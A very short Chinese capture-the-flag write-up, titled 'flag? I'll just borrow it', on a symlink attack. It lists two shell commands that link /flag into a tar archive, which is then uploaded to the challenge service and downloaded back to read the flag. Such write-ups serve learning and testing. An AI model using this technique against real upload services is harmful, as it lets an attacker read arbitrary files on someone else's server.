# flag？我就借走了

考察软链接攻击

在Linux环境下执行

```bash
ln -s /flag link.txt
tar -cvf link.tar link.txt
```

然后上传，最后下载文件，就能拿到flag